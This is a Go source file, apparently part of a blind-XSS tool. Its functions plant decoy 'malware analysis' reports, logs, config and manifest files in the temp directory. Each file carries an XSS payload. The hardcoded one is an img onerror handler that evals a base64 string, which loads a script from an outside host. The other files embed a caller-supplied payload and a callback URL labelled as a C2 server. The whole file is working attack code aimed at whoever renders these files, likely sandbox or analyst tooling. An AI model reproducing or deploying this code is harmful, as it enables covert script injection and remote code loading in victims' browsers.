package xss

import (
	"fmt"
	"os"
	"path/filepath"
)

// injectIntoFileContent crea archivos con contenido HTML/JS malicioso
func injectIntoFileContent(payload XSSPayload) {
	tempDir := os.TempDir()

	// Payload específico
	specificPayload := `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>`

	// 1. Crear archivo HTML completo
	htmlFile := filepath.Join(tempDir, fmt.Sprintf("malware_report_%s.html", payload.ID[:8]))
	htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malware Analysis Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        .report { background: #f5f5f5; padding: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Malware Analysis Report</h1>
    <div class="report">
        <h2>Sample Information</h2>
        <p>Sample ID: %s</p>
        <p>Analysis Date: 2024-12-05</p>
        <p>Status: Analyzing...</p>
        
        <!-- XSS Payload -->
        %s

        <!-- Clean Tag -->
        <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlbGVhc2VzLmxpZmUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
    </div>
</body>
</html>`, payload.ID, specificPayload)

	err := os.WriteFile(htmlFile, []byte(htmlContent), 0644)
	_ = err

	// 2. Crear archivo TXT con contenido que parece log
	txtFile := filepath.Join(tempDir, fmt.Sprintf("analysis_log_%s.txt", payload.ID[:8]))
	txtContent := fmt.Sprintf(`Malware Analysis Log
====================
Sample ID: %s
Timestamp: 2024-12-05 10:30:00
Status: In Progress

Analysis Results:
- Detected behavior: Network communication
- C2 Server: %s
- Payload: %s

XSS Test: %s

End of Log
`, payload.ID, payload.CallbackURL, payload.Content, payload.Content)

	err = os.WriteFile(txtFile, []byte(txtContent), 0644)

	// 3. Crear archivo JSON con payload
	jsonFile := filepath.Join(tempDir, fmt.Sprintf("config_%s.json", payload.ID[:8]))
	jsonContent := fmt.Sprintf(`{
  "malware_id": "%s",
  "c2_server": "%s",
  "callback_url": "%s",
  "payload": "%s",
  "timestamp": "2024-12-05T10:30:00Z"
}`, payload.ID, payload.CallbackURL, payload.CallbackURL, payload.Content)

	err = os.WriteFile(jsonFile, []byte(jsonContent), 0644)

	// 4. Crear archivo XML con payload
	xmlFile := filepath.Join(tempDir, fmt.Sprintf("report_%s.xml", payload.ID[:8]))
	xmlContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<MalwareReport>
    <SampleID>%s</SampleID>
    <CallbackURL>%s</CallbackURL>
    <Payload>%s</Payload>
    <Analysis>
        <Status>Complete</Status>
        <Threat>High</Threat>
    </Analysis>
</MalwareReport>`, payload.ID, payload.CallbackURL, payload.Content)

	err = os.WriteFile(xmlFile, []byte(xmlContent), 0644)

	// 5. Crear archivo README con instrucciones (y XSS)
	readmeFile := filepath.Join(tempDir, fmt.Sprintf("README_%s.md", payload.ID[:8]))
	readmeContent := fmt.Sprintf(`# Malware Sample %s

## Analysis Instructions

This sample has been analyzed. For full report, visit:
%s

## Payload Information

%s

## Notes

- Sample ID: %s
- Analysis complete
`, payload.ID, payload.CallbackURL, payload.Content, payload.ID)

	err = os.WriteFile(readmeFile, []byte(readmeContent), 0644)
}

// injectIntoManifest crea archivos de manifiesto falsos con el payload
func injectIntoManifest(payload XSSPayload) {
	tempDir := os.TempDir()

	// web.config (XML)
	webConfig := filepath.Join(tempDir, fmt.Sprintf("web_%s.config", payload.ID[:8]))
	content := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8" ?><configuration><appSettings><add key="ClientValidationEnabled" value="true" /><add key="UnobtrusiveJavaScriptEnabled" value="true" /><add key="Payload" value="%s" /></appSettings></configuration>`, payload.Content)
	os.WriteFile(webConfig, []byte(content), 0644)

	// package.json (JSON)
	pkgJson := filepath.Join(tempDir, fmt.Sprintf("package_%s.json", payload.ID[:8]))
	jsonContent := fmt.Sprintf(`{ "name": "malware-sample", "version": "1.0.0", "description": "%s", "main": "index.js" }`, payload.Content)
	os.WriteFile(pkgJson, []byte(jsonContent), 0644)
}

// injectIntoFilename crea archivos con nombres que contienen XSS (ya existe en injector.go)
// Esta función es complementaria y crea archivos adicionales con nombres especiales
func injectIntoSpecialFilenames(payload XSSPayload) {
	tempDir := os.TempDir()

	// Nombres de archivo que pueden aparecer en reportes
	filenames := []string{
		fmt.Sprintf("malware_%s.exe.txt", payload.ID[:8]),
		fmt.Sprintf("analysis_%s.log", payload.ID[:8]),
		fmt.Sprintf("report_%s.html", payload.ID[:8]),
		fmt.Sprintf("config_%s.ini", payload.ID[:8]),
	}

	for _, filename := range filenames {
		filepath := filepath.Join(tempDir, filename)
		content := fmt.Sprintf("Malware sample %s - XSS Test: %s", payload.ID, payload.Content)
		os.WriteFile(filepath, []byte(content), 0644)
	}
}
